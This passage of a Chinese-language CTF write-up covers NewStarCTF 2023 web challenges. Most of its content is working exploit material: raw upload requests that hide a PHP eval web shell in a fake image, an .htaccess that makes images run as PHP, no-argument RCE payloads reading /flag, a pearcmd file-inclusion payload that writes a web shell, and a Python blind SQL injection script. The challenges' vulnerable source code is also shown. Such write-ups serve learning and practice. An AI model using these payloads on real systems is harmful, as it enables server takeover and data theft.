class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81/</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundaryx6o4VHZ4XDm5n0AN</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">366</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>------WebKitFormBoundaryx6o4VHZ4XDm5n0AN</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"file\"; filename=\"6.jpg\"</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">image/jpeg</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>GIF89a?</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>&lt;script language=\"php\">@eval($_POST['cmd']);&lt;/script></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>------WebKitFormBoundaryx6o4VHZ4XDm5n0AN</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"submit\"</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Upload!!!</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>------WebKitFormBoundaryx6o4VHZ4XDm5n0AN--</pre></td></tr></table></figure><p>然后再上传.htaccess 文件，让服务器把.jpg 文件当成 php 文件解析：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundaryIkVx38g5yCKcBpoo</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81/</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">470</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>------WebKitFormBoundaryIkVx38g5yCKcBpoo</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"file\"; filename=\".htaccess\"</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>AddType application/x-httpd-php .php .jpg .png .gif </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>php_value auto_append_fi\\</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>le \"php://filter/convert.base64-decode/resource=6.jpg\"</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>------WebKitFormBoundaryIkVx38g5yCKcBpoo</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"submit\"</span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Upload!!!</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>------WebKitFormBoundaryIkVx38g5yCKcBpoo--</pre></td></tr></table></figure><p>用蚁剑连接或者直接命令执行即可。</p>\n<h3 id=\"rce-2\"><a class=\"anchor\" href=\"#rce-2\">#</a> R<span class=\"spoiler\" title=\"你知道得太多了\">C</span>E!!</h3>\n<p>进入题目：</p>\n<blockquote>\n<p>Welcome To NewstarCTF 2023,Nothing here,or you wanna to find some leaked information?</p>\n</blockquote>\n<p>提示有信息泄露，用 dirsearch 扫，扫除 /.git，使用 GitHack 工具获取源码，看到里面有个 bo0g1pop.php</p>\n<p>进入界面：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">';'</span> <span class=\"token operator\">===</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'star'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'star'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'star'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>第一个正则对提交的参数进行处理：任意字符加上可选括号（允许嵌套）更换为空，然后判断是否等于分号，说白了就是限制你只能使用不带参数的函数，也可以说是无参 rce。</p>\n<p>具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcHVyc3VlLXNlY3VyaXR5L3AvMTU0MDYyNzIuaHRtbA==\">RCE 篇之无参数 rce</span></p>\n<p>然后看第二个正则，过滤了很多函数，current 函数用来输出数组中当前元素的值，可以用 pos 函数代替</p>\n<p>先如此操作看看</p>\n<p>?star=print_r(getallheaders());</p>\n<p>回显：</p>\n<blockquote>\n<p><code> </code> Array ( [Host] =&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzRjZmNmMGQyLTM0Y2YtNGQ4Ny05NDAxLTJlY2EwZjY2NDI5ZS5ub2RlNC5idXVvai5jbjo4MQ==\">4cfcf0d2-34cf-4d87-9401-2eca0f66429e.node4.buuoj.cn:81</span> [User-Agent] =&gt; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 [Accept] =&gt; text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7 [Accept-Encoding] =&gt; gzip, deflate [Accept-Language] =&gt; zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 [Upgrade-Insecure-Requests] =&gt; 1 [X-Forwarded-For] =&gt; 42.122.142.35, 101.70.126.158 [X-Forwarded-Proto] =&gt; http )</p>\n</blockquote>\n<p>很明显我们不能直接修改 host 上的值，所以 array_reverse () 一下，在 X-Forwarded-Proto 上操作，或者可以 next 下在 User-Agent 上操作。</p>\n<p>?star=eval(next(getallheaders()));</p>\n<p>User-Agent:system(&quot;ls /&quot;);</p>\n<p>User-Agent:system(&quot;cat /flag&quot;);</p>\n<h2 id=\"week3\"><a class=\"anchor\" href=\"#week3\">#</a> Week3</h2>\n<h3 id=\"include\"><a class=\"anchor\" href=\"#include\">#</a> Include 🍐</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag|log|session|filter|input|data/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\"># Something in phpinfo.php!</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>题目过滤了常见的伪协议，然后提示说在 phpinfo.php 文件中有东西</p>\n<p>?file=phpinfo</p>\n<p>看到一串敏感信息：</p>\n<p Check_register_argc_argv=\"\">fake</p>\n<p>然后检查 register_argc_argv 发现都是 on。</p>\n<p>结合标题，pear，搜索发现是 pear 裸文件包含。</p>\n<p>具体可以参考 p 神的文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZG9ja2VyLXBocC1pbmNsdWRlLWdldHNoZWxsLmh0bWw=\">Docker PHP 裸文件本地包含综述</span></p>\n<p>payload:</p>\n<blockquote>\n<p>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/cmd.php</p>\n</blockquote>\n<p>简单解释一下：</p>\n<p>首先得知道 $_SERVER ['argv'] 通过 query_string 取值，并通过 + 作为分割符，</p>\n<p>然后就是 config-create，阅读其代码和帮助，可以知道，它可以直接创建配置文件，这个命令需要传入两个参数，且第一个参数必须以 / 开头，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>\n<p>这里的：/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval ($_POST ['cmd']);?&gt; 就是第一个参数，由于 php 会将格式错误的代码忽视，所以这句话即起到将 /usr/local/lib/php/pearcmd 包含的作用，又写入了一句话木马文件的内容，</p>\n<p>所以也可以这样写：</p>\n<blockquote>\n<p>?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST['a'])?&gt;+/tmp/cmd.php</p>\n</blockquote>\n<p>最后：</p>\n<blockquote>\n<p>?file=/tmp/cmd</p>\n<p>#post</p>\n<p>0=system(&quot;cat /flag&quot;);</p>\n</blockquote>\n<p>即可。</p>\n<h3 id=\"medium_sql\"><a class=\"anchor\" href=\"#medium_sql\">#</a> medium_sql</h3>\n<p>相较于 week1 过滤了 union</p>\n<p>不过对咱没啥影响，脚本依旧可以用：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>burp0_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://4eee49a9-7a7b-4891-933b-27c782f49044.node4.buuoj.cn:81/\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> string<span class=\"token punctuation\">.</span>printable<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#url = burp0_url + \"?id=TMP1589' And Ascii(Substr(database(),&#123;&#125;,1)) = &#123;&#125;%23\".format(i, ord(j))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#url = burp0_url + \"?id=TMP1589' And Ascii(Substr((Select table_name From INFOrmation_schema.tables Where table_schema='ctf' limit 1,1),&#123;&#125;,1))=&#123;&#125;%23\".format(i, ord(j))</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#here_is_flag</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#url = burp0_url + \"?id=TMP1589' And Ascii(Substr((Select column_name From INFOrmation_schema.columns Where table_schema='ctf' And table_name='here_is_flag' limit 0,1),&#123;&#125;,1))=&#123;&#125;%23\".format(i, ord(j))</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        url <span class=\"token operator\">=</span> burp0_url <span class=\"token operator\">+</span> <span class=\"token string\">\"?id=TMP1589' And Ascii(Substr((Select flag From here_is_flag),&#123;&#125;,1))=&#123;&#125;%23\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"id: TMP1589\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            flag <span class=\"token operator\">+=</span> j</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr></table></figure><h3 id=\"pop-gadget\"><a class=\"anchor\" href=\"#pop-gadget\">#</a> POP Gadget</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Begin</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Welcome to NewStarCTF 2023!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Then</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Good Job!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Handle</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$vars</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">obj</span><span class=\"token operator\">-></span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Super</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$obj</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">obj</span><span class=\"token operator\">-></span><span class=\"token function\">getStr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 